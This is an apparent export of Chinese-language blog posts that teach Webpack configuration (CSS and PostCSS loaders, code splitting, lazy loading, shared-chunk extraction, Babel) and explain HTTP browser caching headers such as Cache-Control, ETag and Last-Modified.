    <content type="text"><![CDATA[引入CSS style-loader：为我们要载入的页面创建style标签。 css-loader：让css可以被js模块化。 style-loader style-loader/url style-loader将css打包到js中，通过js执行，将css插入在html中生成的style标签中。 style-loader/url 配合 file-loader，file-loader会将css抽出单独进行打包，style-loader/url通过link将css引入。 多个样式会产生多个link标签，所以这么做不合适。 style-loader/useable style-loader/useable 配合 file-loader 可以通过css.use()，css.unuse()，插入或者不插入css。 options insertAt（插入位置） insertInto（插入到dom） singleton（是否使用一个Style标签） transform（转化，浏览器环境下，插入页面前）。 CSS-loader options alias（解析的别名） importLoader （@import） Minimize（是否压缩） modules（启用css-modules） Less/Sass loader提取CSS extract-loader ExtractTextWebpackPlugin（主流） ExtractTextWebpackPlugin 用于将所有的css提取成一个文件 fallback: 告诉ExtractTextWebpackPlugin，如果不需要该插件处理 ，那么需要什么loader去处理。 use: 告诉ExtractTextWebpackPlugin，将css提取出来以后，需要什么loader去处理。12345678910111213141516new ExtracTextWebPackPlugin.extract(&#123; fallback: &#123; loader: &apos;style-loader&apos;, options: &#123; singleton: true, transform: &apos;./css.transform.js&apos; &#125; &#125;, use: [ &#123; loader: &apos;css-loader&apos; &#125;,&#123; loader: &apos;less-loader&apos; &#125; ]&#125;) 1234567plugins: [ new ExtractTextWebpackPlugin(&#123; filename: &apos;[name].min.css&apos;, // 可以控制一些动态加载的样式，allChunks：false,写在js中css的代码不会被抽出一起被提取 allChunks: false &#125;)] 总结 如何在Webapck中引入css？style-loader，css-loader less/sass 预处理语言。 CSS module。 ExtractTextWebpackPlugin，提取为单独的css。 PostCSS A tool for transforming CSS with JavaScripit。 基于PostCSS生态产生了许多使用的工具：postcss、postcss-loaer、Autoprefixed、postcss-cssnano、postcss-cssnext。 Autoprefixer：浏览器前缀处理。 CSS-nano：压缩css。 CSS-next：可以让你使用CSS新特性。 实战12345678910111213&#123; loader: &apos;postcss-loader&apos;, options: &#123; options: &#123; ident: &apos;postcss&apos;, plugins: [ // postcss-cssnext包含autoprefixer // require(&apos;autoprefixer&apos;)(), require(&apos;postcss-cssnext&apos;)() ] &#125; &#125;&#125;]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（六）-代码分割及懒加载]]></title>
    <url>%2F2018%2F02%2F18%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E5%85%AD%EF%BC%89-%E4%BB%A3%E7%A0%81%E5%88%86%E5%89%B2%E5%8F%8A%E6%87%92%E5%8A%A0%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[require.ensure []: dependencies。依赖，加载但并不执行。 callback中真正执行。 errorCallback。 chunkName。 require.include引入模块不执行。用于提前加载2个及以上依赖的第三方模块。 ES 2015 Loader Spec System.import() -&gt; import() import() -&gt; 返回promise import().then() 这是提倡的 webpack import function代码分割 分离业务代码 和 第三方依赖 分离业务代码 和 业务公共代码 和 第三方依赖 分离首次加载 和 访问后加载的代码 代码分割实战使用require.ensure 异步加载不使用 4份文件。pageA、subpageA、subpageB、moduleA。 pageA依赖于subpageA和subpageB及第三方依赖库lodash。subpageA和subpageB均依赖于moduleA。 12345678910111213var webpack = require(&apos;webpack&apos;)var path = require(&apos;path&apos;)module.exports = &#123; entry: &#123; &apos;pageA&apos;: &apos;./src/PageA.js&apos; &#125;, output: &#123; path: path.resolve(__dirname, &apos;./dist&apos;), filename: &apos;[name].bundle.js&apos;, chunkFilename: &apos;[name].chunk.js&apos; &#125;&#125; 此时打出的包为一份。 12 Asset Size pageA.bundle.js 545 kB 0 [emitted] [big] pageA 在pageA中使用require.ensure123456789101112import &apos;./subPageA&apos;import &apos;./subPageB&apos;/** * 仅仅require.ensure([&apos;lodash&apos;])而不传入回调， * 代码仅加载，不执行 */require.ensure([&apos;lodash&apos;], function () &#123; var _ = require(&apos;lodash&apos;)&#125;, &apos;vendor&apos;)export default &apos;pageA&apos; 此时打包结果，chunkName也是我们在output中指定的chunkFilename: ‘[name].chunk.js’。12vendor.chunk.js 541 kB 0 [emitted] [big] vendorpageA.bundle.js 7.14 kB 1 [emitted] pageA 在pageA中多次使用require.ensure12345678require.ensure(&apos;./subPageA&apos;, function () &#123;&#125;)require.ensure(&apos;./subPageB&apos;, function () &#123;&#125;)require.ensure([&apos;lodash&apos;], function () &#123; var _ = require(&apos;lodash&apos;)&#125;, &apos;vendor&apos;)export default &apos;pageA&apos; 此时打包结果为12345 Asset Size Chunks Chunk Namesvendor.chunk.js 541 kB 0 [emitted] [big] vendor 1.chunk.js 581 bytes 1 [emitted] 2.chunk.js 581 bytes 2 [emitted]pageA.bundle.js 6.41 kB 3 [emitted] pageA 在pageA中多次使用require.ensure，并对chunk命名12345678require.ensure(&apos;./subPageA&apos;, function () &#123;&#125;, &apos;subPageA&apos;)require.ensure(&apos;./subPageB&apos;, function () &#123;&#125;, &apos;subPageB&apos;)require.ensure([&apos;lodash&apos;], function () &#123; var _ = require(&apos;lodash&apos;)&#125;, &apos;vendor&apos;)export default &apos;pageA&apos; 此时打包结果为 12345 Asset Size Chunks Chunk Names vendor.chunk.js 541 kB 0 [emitted] [big] vendorsubPageB.chunk.js 581 bytes 1 [emitted] subPageBsubPageA.chunk.js 581 bytes 2 [emitted] subPageA pageA.bundle.js 6.44 kB 3 [emitted] pageA 由于subPageA和subPageB均依赖于moduleA，所以打的两个包中都有moduleA的代码。 使用require.include提前加载公共依赖moduleA。12345678910require.include(&apos;./moduleA.js&apos;)require.ensure(&apos;./subPageA&apos;, function () &#123;&#125;, &apos;subPageA&apos;)require.ensure(&apos;./subPageB&apos;, function () &#123;&#125;, &apos;subPageB&apos;)require.ensure([&apos;lodash&apos;], function () &#123; var _ = require(&apos;lodash&apos;)&#125;, &apos;vendor&apos;)export default &apos;pageA&apos; subpageA和subpageB的chunk均变小了，且两个chunk中均没有moduleA的代码了。12345 Asset Size Chunks Chunk Names vendor.chunk.js 541 kB 0 [emitted] [big] vendorsubPageB.chunk.js 369 bytes 1 [emitted] subPageBsubPageA.chunk.js 369 bytes 2 [emitted] subPageA pageA.bundle.js 6.67 kB 3 [emitted] pageA 在index.html中引入我们使用懒加载机制的代码123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;../dist/pageA.bundle.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 此时会报错，这是因为webpack并不知道这些打包出来的chunck的位置，需要在output中配置publicpath，这个地址也可以是cdn。 1Error: Loading chunk 2 failed. 加入publicPath，为webpack指明打包出来的chunk的位置。 123456output: &#123; path: path.resolve(__dirname, &apos;./dist&apos;), publicPath: &apos;../dist/&apos;, filename: &apos;[name].bundle.js&apos;, chunkFilename: &apos;[name].chunk.js&apos; &#125;, require.ensure懒加载机制注意事项12require.ensure(&apos;./subPageA&apos;, function () &#123;&#125;, &apos;subPageA&apos;) 123require.ensure(&apos;./subPageA&apos;, function () &#123; require(&apos;./subPageA&apos;)&#125;, &apos;subPageA&apos;) 如果我们不在回调内部 require 一次懒加载的subPageA模块，subPageA是不会执行的。它仅仅只加载进来分割的chunk。 因为 require.ensure仅仅是将分割的代码引入到我们的页面中，Webpack3动态的import，能够加载。 Webpack3动态importWebpack3动态import，不仅仅是将代码引入到我们的页面中，它还会将代码执行。 12345678910111213141516require.include(&apos;./moduleA.js&apos;)import( /* webpackChunkName:&apos;subpageA&apos; */ &apos;./subPageA&apos;).then()import( /* webpackChunkName:&apos;subpageB&apos; */ &apos;./subPageB&apos;).then()import( /* webpackChunkName:&apos;vendor&apos; */ &apos;lodash&apos;).then()export default &apos;pageA&apos; / webpackChunkName:’subpageA’ /，是魔法注释，为chunk指定名称 打包结果12345Asset Size Chunks Chunk Names vendor.chunk.js 541 kB 0 [emitted] [big] vendorsubpageB.chunk.js 369 bytes 1 [emitted] subpageBsubpageA.chunk.js 394 bytes 2 [emitted] subpageA pageA.bundle.js 6.53 kB 3 [emitted] pageA Webpack代码分割使用async 我们的subPageA和subPageB都依赖于moduleA. 添加plugin配置 12345new webpack.optimize.CommonsChunkPlugin(&#123; async: &apos;async-common&apos;, children: true, minChunks: 2&#125;), 此时将公共的moduleA提取出来 1async-common-pageA.chunk.js]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（五）-如何使用Webpack切分公共代码]]></title>
    <url>%2F2018%2F02%2F18%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E4%BA%94%EF%BC%89-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Webpack%E5%88%87%E5%88%86%E5%85%AC%E5%85%B1%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[提取公用代码当前前端的开发模式是模块化开发，因此会有许多模块依赖的公共模块。 减少代码冗余 提高加载速度 CommonsChunkPlugin 其实是webpack内置的插件函数：webpack.opyimize.CommonChunkPlugin。 使用： 123plugins: [ new webpack.optimize.CommonsChunkPlugin(option)] 这里的option: options.name or options.names 表示chunk的名称 options.filename 表示公用代码打包后的文件名 options.minChunks 可以是数字，函数，特殊值。数字：例如为2，表示代码出现2次，就提取为公用代码。特殊值infinity：表示不会打包公共模块。函数：自定义提取逻辑。 options.chunks 指定了提取代码的范围，你从哪几个模块提取公用代码。 options.children options.deepChildren 是否从子模块查找依赖 options.async 创造异步公共代码块。 简单的配置介绍1234567891011121314151617181920212223242526var webpack = require(&apos;webpack&apos;)var path = require(&apos;path&apos;)module.exports = &#123; entry: &#123; &apos;pageA&apos;: &apos;./src/PageA.js&apos;, &apos;pageB&apos;: &apos;./src/PageB.js&apos;, &apos;vendor&apos;: [&apos;lodash&apos;], &#125;, output: &#123; path: path.resolve(__dirname, &apos;./dist&apos;), filename: &apos;[name].bundle.js&apos;, chunkFilename: &apos;[name].chunk.js&apos; &#125;, plugins: [ new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;common&apos;, minChunks: 2, chunks: [&apos;pageA&apos;, &apos;pageB&apos;] &#125;), new webpack.optimize.CommonsChunkPlugin(&#123; names: [&apos;vendor&apos;, &apos;manifest&apos;], minChunks: Infinity &#125;) ]&#125; 以下内容将chunks指定的范围pageA和pageB两个js的公共代码部分打包为命名为common的chunk 12345new webpack.optimize.CommonsChunkPlugin(&#123; name: &apos;common&apos;, minChunks: 2, chunks: [&apos;pageA&apos;, &apos;pageB&apos;]&#125;), 以下内容将vendor中的第三方库lodash单独打包在名为vendor的chunk中，将webpack生成的代码打包在名为manifest的chunk中中。 12345entry: &#123; &apos;pageA&apos;: &apos;./src/PageA.js&apos;, &apos;pageB&apos;: &apos;./src/PageB.js&apos;, &apos;vendor&apos;: [&apos;lodash&apos;],&#125;, 1234new webpack.optimize.CommonsChunkPlugin(&#123; names: [&apos;vendor&apos;, &apos;manifest&apos;], minChunks: Infinity&#125;)]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（四）-如何使用Webpack编译ES6]]></title>
    <url>%2F2018%2F02%2F17%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E5%9B%9B%EF%BC%89-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Webpack%E7%BC%96%E8%AF%91ES6%2F</url>
    <content type="text"><![CDATA[如何使用webpack？命令行 webpack -h 显示webpack所有命令 webpack -v webpack版本 直接执行打包命令行 1webpack &lt;entry&gt; [&lt;entry&gt;] &lt;output&gt; webpack –config webpack.conf.dev.js 通过配置文件打包 webpack-cli 交互式的初始化一个项目。 直接迁移项目 v1 -&gt; v2。 目前其实是一个施工现场。 第三方脚手架 Vue-cli Angular-cli React-cli 利用Webpack对JS代码进行打包使用命令行：1webpack &lt;entry&gt; [&lt;entry&gt;] &lt;output&gt; 我们对下面的代码进行打包123456789// 文件app.jsimport sum from &apos;./sum.js&apos;console.log(&apos;sum(23, 24)&apos;, sum(23, 24))// 文件sum.jsexport default (a, b) =&gt; &#123; return a + b&#125; 执行命令行 npx webpack app.js bundle.js 打包完成12345678➜ 3-2 npx webpack app.js bundle.jsHash: c0abc928b2a38edebaf2Version: webpack 3.11.0Time: 61ms Asset Size Chunks Chunk Namesbundle.js 2.98 kB 0 [emitted] main [0] ./app.js 74 bytes &#123;0&#125; [built] [1] ./sum.js 43 bytes &#123;0&#125; [built] 使用webpack配置文件，更灵活的打包 编写配置文件 webpack.config.js 12345678module.exports = &#123; entry: &#123; app: &apos;./app.js&apos; &#125;, output: &#123; filename: &apos;[name].[hash:5].js&apos; &#125;&#125; 执行 npx webpack 或者 npx webpack –config webpack.config.js。 得到结果。 123456789➜ 3-2 npx webpackHash: 4ecc125268204843e654Version: webpack 3.11.0Time: 65ms Asset Size Chunks Chunk Namesapp.4ecc1.js 3.18 kB 0 [emitted] app [0] ./app.js 162 bytes &#123;0&#125; [built] [1] ./sum.js 43 bytes &#123;0&#125; [built] [2] ./minus.js 45 bytes &#123;0&#125; [built] Babel Webpack仅仅将模块化的文件打包出来，想要使用目前代码环境无法支持的新特性，需要Babel。 Babel-loader，运行速度慢，需要大量的词法分析和编译转换。 Babel-loader 必须配合Babel - Presets 进行打包。Presets为打包制定了规范。 Babel Presets Babel Presets 简介 es2015 es2016 es2017 env：包括2015、2016、2017等规范。 babel-preset-react babel-preset-stage 0-3 是未正式发布的一些规范 通过设置presets可以规定babel-loader为我们打包的根据，即这个presets其实是一种转码的规则集。 Babel Presets的targets配置 当你通过babel编译时，targets指明了哪些语法需要编译。例如：targets.browsers（浏览器）。 targets.browsers: “last 2 versions”。主流浏览器的最近两个版本。 targets.browsers: “&gt; 1%”。用户使用率大于1%的浏览器。 在配置loader时，可以为loader配置options 123456789101112131415161718192021222324252627282930module.exports = &#123; entry: &#123; app: &apos;./app.js&apos; &#125;, module: &#123; rules: [ &#123; test: /\.js$/, // use: &apos;babel-loader&apos;, // 为babel指定preset use: &#123; loader: &apos;babel-loader&apos;, options: &#123; presets: [ [&apos;@babel/preset-env&apos;, &#123; targets: &#123; browsers: [&apos;&gt; 1%&apos;, &apos;last 2 versions&apos;] &#125; &#125;] ] &#125; &#125;, exclude: &apos;/node_modules/&apos; &#125; ] &#125;, output: &#123; filename: &apos;[name].[hash:5].js&apos; &#125;&#125; 打包结果：es6被编译为你指定的preset规范。 123456let func = () =&gt; &#123;&#125;const NUM = 45let arr = [1, 2, 4]let arrNew = arr.map(item =&gt; item * 2)console.log(&apos;new Set(arrNew)&apos;, new Set(arrNew)) 1234567891011121314/* 0 *//***/ (function(module, exports) &#123;var func = function func() &#123;&#125;;var NUM = 45;var arr = [1, 2, 4];var arrNew = arr.map(function (item) &#123; return item * 2;&#125;);console.log(&apos;new Set(arrNew)&apos;, new Set(arrNew));/***/ &#125;)/******/ ]); Babel Polyfill与Babel Runtime Transform 为什么需要Babel Polyfill与Babel Runtime Transform？ Babel-loader仅仅针对presets指定的规范进行编译打包。但是，某些es6的方法，在低版本浏览器是不兼容的，因此我们需要上面的两个插件。 例如：在低版本浏览器，generator，set，map，array.from，array.includes等是不兼容的，而仅仅使用Babel并不能对其进行转换。需要插件为我们在浏览器（生产环境）中实现这两个方法。 Babel Polyfil（全局垫片） 是为开发应用准备的，并不是为开发框架准备的。 使用时，npm install babel-polyfill -save，save表示，它是生产环境下的依赖。 接着，import “babel-polyfill” Babel Runtime Transform (局部垫片) 是为开发框架准备的，不会污染全局。别人在使用你的框架时，不会被污染。 使用，npm install @babel/plugin-transform-runtime -D，npm install @babel/runtime -S。 紧接着，在项目中建立.babelrc，进行配置。之前的配置也可以移除，直接放在.babelrc中。123456789101112// .babelrc&#123; &quot;presets&quot;: [ [&quot;@babel/preset-env&quot;, &#123; &quot;targets&quot;: &#123; &quot;browsers&quot;: [&quot;&gt; 1%&quot;, &quot;last 2 versions&quot;] &#125; &#125;] ], &quot;plugins&quot;: [&quot;@babel/transform-runtime&quot;]&#125; 总结 平时开发直接使用 123456789&#123; &quot;presets&quot;: [ [&quot;@babel/preset-env&quot;, &#123; &quot;targets&quot;: &#123; &quot;browsers&quot;: [&quot;&gt; 1%&quot;, &quot;last 2 versions&quot;] &#125; &#125;] ]&#125; 开发应用时，如果使用了ES6的新方法直接 import ‘babel-polyfill’ 如果是开发UI组件库，使用局部垫片，不会对全局造成污染。1234567891011&#123; &quot;presets&quot;: [ [&quot;@babel/preset-env&quot;, &#123; &quot;targets&quot;: &#123; &quot;browsers&quot;: [&quot;&gt; 1%&quot;, &quot;last 2 versions&quot;] &#125; &#125;] ], &quot;plugins&quot;: [&quot;@babel/transform-runtime&quot;]&#125;]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（三）-你应该知道的Webpack基本知识]]></title>
    <url>%2F2018%2F02%2F17%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E4%B8%89%EF%BC%89-%E4%BD%A0%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84WebPack%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[Webpack 更迭 v1: 编译打包、HRM（热更新）、代码分割、文件处理。 v2: Tree Shaking（打包引用的代码时，会去除未使用的代码）、ES module、动态 Import（是一个动态的Import函数）、新的更人性化的文档。 v3: Scope Hoisting（作用域提升，提升了打包后的代码性能。老版本的webpack 将代码打包在闭包当中，这些封装的闭包会损耗浏览器性能。因此。webpack学习他的对手rollup，将所有的代码的模块的作用域，提高到单一的作用域中，这样就提升了打包后代码的运行速度。）、Magic Comments （配合动态import使用，可以使得webpack懒加载一段代码。可以指定打包后的chunk的名字）。 版本迁移 V1 -&gt; V2 配置文件不兼容。 V2 -&gt; V3 承诺尽可能兼容API。 因此，webpack的配置正在趋于稳定。 Webpack核心概念Entry 是代码入口：可以理解为某一段代码的入口。通过代码的入口，直接或间接找到所需要的所有依赖。 是打包入口：告诉webpack，以哪个文件为起点找到依赖，再找到依赖的依赖。 可以是一个或者多个entry。例如：多页面程序，一个页面是一个入口。单页面程序，将业务代码和框架代码分为两个entry。1234567891011121314151617181920212223module.exports = &#123; entry: &apos;index.js&apos;&#125;module.exports = &#123; entry: [&apos;index.js&apos;, &apos;vender.js&apos;]&#125;// index -&gt; &apos;index.js&apos;// 这种key -&gt; value 的形式表明，&apos;index.js&apos;是一个独立的chunk(一个代码块)，即index这个key对应的chunk是&apos;index.js&apos;。module.exports = &#123; entry: &#123; index: &apos;index.js&apos; &#125;&#125;// 对象方式，也易于修改，直接增加key就可以了module.exports = &#123; entry: &#123; index: [&apos;index.js&apos;, &apos;app.js&apos;], vendor: &apos;vendor.js&apos; &#125;&#125; OutPut 打包生成的文件（bundle）。 可以是一个或多个。 如何定义一个entry和output对应起来呢？1234567// 单个文件对应单个输出module.exports = &#123; entry: &apos;index.js&apos;, output: &#123; filename: &apos;index.min.js&apos; &#125;&#125; 123456789101112// 多个文件对应多个输出，webpack自定义了规则// [name]对应entry的key -&gt; value 中的key// 也是可以配合cdn的module.exports = &#123; entry: &#123; index: &apos;index.js&apos;, vendor: &apos;vendor.js&apos; &#125;, output: &#123; filename: &apos;[name].min.[hash: 5].js&apos; &#125;&#125; Loaders（处理JS之外的资源） 处理文件 将非JS的资源文件转换为模块123456789// 当你满足了test的条件，就是用use的Loadermodule.exports = &#123; module: &#123; rules: [&#123; test: /\.css$/, use: &apos;css-loader&apos; &#125;] &#125;&#125; Plugins（通过插件系统赋能） plugin参与打包的整个过程。 有打包优化和压缩、配置编译时变量等功能。12345module.exports = &#123; plugins: [ new webpack.optimize.UglifyJsPlugin() ]&#125; 名词 chunk：块。在webpack中，代表了代码块。 Bundle: 一捆。打包后的代码束。 Module：模块，例如：loaders处理了一个图片，也可以看做一个模块。处理了css，也可以看做一个模块。]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（二）- 模块化的变迁]]></title>
    <url>%2F2018%2F02%2F17%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E4%BA%8C%EF%BC%89-%20%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E5%8F%98%E8%BF%81%2F</url>
    <content type="text"><![CDATA[模块化开发JS模块化 命名空间 -&gt; commonjs(Node社区，只能用于服务端) -&gt; AMD/CMD/UMD -&gt; ES6 module 命名空间：库名.类别名.方法名。缺点：1. 命名空间被覆盖了，是无法检测到的。2. 易记错。 123var NameSpave = &#123;&#125;NameSpace.type = NameSpace.type || &#123;&#125;NameSpace.type.method = function () &#123;&#125; CommonJS一个文件，是一个模块。模块内的文件，外界无法访问。只能模块内部通过module.exports暴露模块接口，才能被外界访问到。外界通过require引入模块，但是模块的加载是同步执行的。 AMDAsync Module Definition，异步模块定义。使用define定义模块，使用require加载模块。特点：依赖前置，提前执行。在初始化一个模块时，需要提前声明你初始化需要的所有模块，这些模块会提前全部执行初始化。 CMDCommon Module Definition。一个文件为一个模块。使用define定义模块，require来加载模块。特点：尽可能懒执行。在AMD某个模块执行初始化时，该模块的所有依赖是前置执行完成的。CMD不是，只有需要时，才会去执行，尽可能的懒执行。 UMDUniversal Module Definition。通用模块定义。首先判断是否支持AMD，其次判断是否支持CommonJS，都不支持就直接定义为全局变量。 ESM一个文件是一个模块。通过export/import输出输入模块 CSS模块化 CSS模块化说的更多的是一种设计模式。 例如oocss、smacss、atomic css、mcss、amcss、BEM、css modules]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Webpack（一）- 从刀耕火种走向工程化]]></title>
    <url>%2F2018%2F02%2F17%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAWebpack%EF%BC%88%E4%B8%80%EF%BC%89-%20%E4%BB%8E%E5%88%80%E8%80%95%E7%81%AB%E7%A7%8D%E8%B5%B0%E5%90%91%E5%B7%A5%E7%A8%8B%E5%8C%96%2F</url>
    <content type="text"><![CDATA[开发分工变化 曾经：前端完成View(视图，即静态页面)，View Logic(视图上的逻辑，即交互、动画等)。后端拿到这些静态页面以后，通过脚本语言php，jsp去填写静态数据，路由，渲染。 现在：前端不再是静态的页面了，有了自己的路由、数据逻辑、渲染逻辑，大量的业务逻辑从后端转移到前端。 因此，前端越来越复杂，项目也需要一定的分层结构，需要构建。 框架的变化前端的武器增加了：JS库（主要解决兼容性问题）-&gt; MVC（backbone引领了分层思想）&gt; MVVM（ng，react，vue）。 CSS语言的变化 某些css属性需要带有浏览器前缀名。 sass、less、stylus等预处理语言。 JS语言的变化通过babel打包编译，我们可以使用JS的许多超前特性。 环境的变化代码同构：Node、浏览器、native移动端。一份代码跑在三端。 社区的变化 github npm 通过npm命令管理本地仓库，更进一步管理项目的第三方库构建，进行打包上线。 工具的变化 grunt、gulp（流式管理）、fis webpack、rollup 总结：前端为何需要构建？ 开发复杂化后端业务逻辑大量前移。 框架去中心化之前的库都是大而全的，如今现在的前端库专注于解决单个的问题。因此，库越来越零散，需要打包处理。 语言编译化 开发模块化]]></content>
      <categories>
        <category>深入浅出Webpack</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web前端性能优化（五）- 基于Http的缓存策略]]></title>
    <url>%2F2018%2F02%2F15%2F%E4%BD%A0%E5%BF%85%E9%A1%BB%E6%87%82%E7%9A%84%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89-%20CSRF%2F</url>
    <content type="text"><![CDATA[基于Http的缓存策略在大规模系统中，我们希望有一个自动的缓存策略，而不是手动的通过localstorage去缓存。通过服务端和浏览器端基于http请求头的协商的方式，形成一个通用的缓存文件的策略。 httpheader Cache-Control：Cache-Control可以出现在Response的Header中，也可以出现在Request的Header中。 Cache-Control具有以下属性： max-age：指定缓存的最大有效时间。max-age可以让浏览器在规定的时间段内，不向服务端发起一个请求。因为max-age表示，服务端告诉浏览器，在这段时间内，这个资源都是有效的，都是不会过期的。这个属性比expires的优先级要高。 s-maxage、public、private: 也是指定缓存的有效时间，但仅仅是指定public的缓存。缓存设备有很多，例如：CDN作为一种缓存设备。缓存设备有两种情况：1.是private的缓存设备。例如：客户端浏览器缓存的信息，只有客户端浏览器才能使用，这种缓存便是private。2.另一种是public的缓存设备，能被很多用户去访问，读取信息。总结一下，s-maxage的优先级是高于max-age的，同时它也只对public缓存设备生效。实例来说，一个资源被设置了s-maxage，那么它会去public的缓存设备（CDN）去读有效信息。也就是说，规定了s-maxage的资源，它不是去浏览器去拿数据，而是去cdn去拿数据，cdn是我们的public缓存设备。这个请求发往我们的cdn，cdn下发一个缓存状态和缓存信息。对于公共的cdn设备来说，在s-maxage这一段时间内，这个缓存资源是不会过期的。等超过了s-maxage，我们的cdn才会去源服务器去更新它存的资源，是一个回源的动作。 no-cache：no-cache一般与max-age搭配使用，no-cache表示，会询问浏览器是否有该资源的缓存策略，文件是否过期。而不是像max-age直接将该资源从浏览器的缓存读出。它会发送请求到服务端，服务端发送类似于last-modify的信息，去进一步判断当前浏览器端缓存是否过期。所以，no-cache能让所有请求都到服务端。 no-store：不存，完全不使用缓存。 Expires 缓存过期时间，用来指定资源到期的时间，是服务端的具体的时间点。 告诉浏览器在过期时间前浏览器可以直接从浏览器缓存取数据，而无需再次请求。 max-age和expires之间的关系：max-age的优先级高于expires。expires出自于http1.0，max-age出自于http1.1。在http1.1版本中，我们希望hash的管理是通过一个统一的header去管理，所以增加了cache-control去控制max-age。当存在max-age时，expires实际上时被忽略的。 max-age和Expires 是一个强浏览器缓存策略，当Response Header设置了max-age和Expires后。当http请求中的这两个请求头生效时，浏览器不会向服务器去发起任何请求，而是直接从浏览器缓存中读取相应的数据。 因此，当我的服务端的资源更新时，设置了这两个请求头的前提下，我们的客户端浏览器是无法感知到的。 last-modified/if-modified-since 是基于客户端和服务端协商的缓存机制。 当浏览器向服务端发送http请求。 服务端在返回的response中，种下last-modified的响应头字段。 浏览器拿到这个字段以后，会将其存储。也就是说，浏览器拿到了服务端资源的最新的更新时间。 浏览器存储当前已知的资源最新更新时间是使用字段if-modified-since。 当浏览器再针对这个url发送请求时，会带上这个if-modified-since。 服务端接收到这个header。此时客户端告诉服务端我拿到的是你某个时间点的资源版本，服务端验证资源是否已经更新过了。如果没有更新，返回一个304的状态以及last-modified，告诉客户端，资源没有更新，你可以使用这个资源在客户端的缓存。浏览器根据这个304的状态去客户端的缓存中，读取这个文件使用。 如果服务端发现客户端发送的是老版本时间，就返回一个200的状态以及最新的last-modified，告诉客户端，不能使用缓存，使用我最新发给你的资源。 last-modified/if-modified-since 实质是服务端和客户端的缓存协商机制。 last-modified/if-modified-since 要和cache-control联合使用。因为cache-control存在max-age的情况，且max-age还没有过期，浏览器以max-age为准，直接从浏览器缓存中读取资源。max-age过期以后，浏览器才会使用这种协商机制。 last-modified/if-modified-since 和 max-age都是服务端控制的缓存策略。 last-modified/if-modified-since存在的问题：1.某些服务端不能获取精确的修改时间。2.文件修改时间改了，但文件内容没有变。这种情况下的缓存失效，是资源浪费。 Etag/If-None-Match Etag是文件内容的hash值，也需要与cache-control共同使用。 Etag是服务端通过response header下发的响应头。 if-None-Match会将下发的Etag的hash值通过request 带到服务端去。 这个协商机制比 last-modified/if-modified-since 的时间机制更加精确，是基于文件内容的。当文件内容改变时，会直接反映在Etag上。 etag 的优先级比 last-modified 的优先级更高。 分级缓存策略 针对大量的静态资源，服务端基于http header配置缓存策略。 缓存流程弱缓存流程图 用户发出请求去请求资源。 浏览器根据url判断资源是否存在缓存。 没有缓存。会去向服务器发出请求，服务端响应请求，并下发缓存的协商策略。最终浏览器拿到这个协商策略，展示我们的页面。 存在缓存，就去解析缓存文件。 浏览器先通过expires和max-age去检查缓存是否已经过期。缓存没有过期，就会直接使用缓存的内容，展示我们的页面。 缓存过期，浏览器取找ETag属性。v 有ETag，会向服务器请求带上if-none-match字段。服务器根据if-none-match，判断浏览器上的文件和我们最新的文件的hash值是否相同。相同，返回304，浏览器读取本地缓存，展示页面。返回200，表示服务器文件更新了，我们的浏览器会拿到新的文件，新的ETag. 没有Etag,就走last-modified逻辑。 强缓存流程图 cache-control决定我们的浏览器是否使用缓存存储。 不使用缓存存储，那么cache-control对应的就是no-store。 如果使用缓存存储，就判断每次请求是否重新验证。 需要重新验证，那就不会从强缓存去读缓存的文件，而是通过http的header去和服务端进行一个协商。 就是说，no-cache，我的每个请求都会发到服务端，由服务端决定缓存是否生效。 不需要重新验证，那我们就需要使用我们的max-age,s-maxage。 看是否允许被代理服务缓存。 不允许就是Private，也就是浏览器层面的缓存，我们就去设max-age。 